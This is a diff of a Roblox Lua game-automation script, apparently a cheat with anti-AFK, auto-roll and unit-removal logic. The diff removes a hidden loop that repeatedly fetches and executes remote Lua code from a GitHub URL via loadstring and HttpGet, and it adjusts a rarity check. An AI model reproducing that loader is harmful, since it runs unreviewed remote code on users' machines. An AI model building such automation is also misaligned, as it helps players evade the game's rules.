@@ -12,11 +12,6 @@ local deleteRemote = ReplicatedStorage:WaitForChild("RemoteFunctions"):WaitForCh
 local VirtualUser = game:GetService("VirtualUser")
 local StartRolls = false
 
-task.spawn(function()
-	while true do
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/thideGTD/ScriptTreo/refs/heads/main/TNGHIA.lua"))()
-	end
-end)
 local function AntiAfk2()
     task.spawn(
         function()
@@ -92,7 +87,7 @@ local function RemoveUnit()
             rarity = nil
         end
 		print(itemId, rarity)
-		if rarity and (rarity.Rarity == "ra_godly" or itemId == "unit_tomato_plant" or itemId == "unit_rafflesia" or itemId == "unit_lawnmower" or rarity.Rarity == "ra_exclusive") then
+		if rarity and (rarity == "ra_godly" or itemId == "unit_tomato_plant" or itemId == "unit_rafflesia" or itemId == "unit_lawnmower" or rarity == "ra_exclusive") then
 			kept[itemId] = true
 			continue
 		end
@@ -152,7 +147,6 @@ while true do
 	end
 	_wait(5)
 end
-
 
 
 
